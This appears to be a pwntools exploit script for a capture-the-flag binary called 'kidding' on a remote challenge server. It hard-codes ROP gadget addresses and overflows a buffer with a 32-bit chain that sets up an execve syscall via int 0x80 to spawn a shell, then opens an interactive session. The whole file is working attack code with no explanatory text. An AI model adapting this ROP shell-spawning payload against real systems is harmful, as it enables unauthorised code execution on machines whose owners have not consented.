from pwn import *
HOST = 'ctf.pwnavle.tw'
PORT = 8361
binary = 'kidding'
pop_eax = 0x080b8536
pop_ebx = 0x080481c9
pop_ecx = 0x080583c9
pop_edx = 0x0806ec8b
int_0x80 = 0x0806c825
pop_edx_ecx_ebx = 0x0806ecb0
padding_length = 8
sh = 0x80cdec8
if __name__ == '__main__':
    mode = raw_input("mode:")
    if mode == 'r\n':
        r = remote(HOST,PORT)
    else:
        r = process('./'+binary)
    raw_input('time to attach')
#using recvuntil is better
    payload = cyclic(padding_length)+p32(0xdeadbeef)+p32(pop_eax)+p32(0xb)+p32(pop_ebx)+p32(sh)+p32(pop_ecx)+p32(0x0)+p32(pop_edx)+p32(0x0)+p32(int_0x80)
    r.sendline(payload)
    r.interactive()

    
               
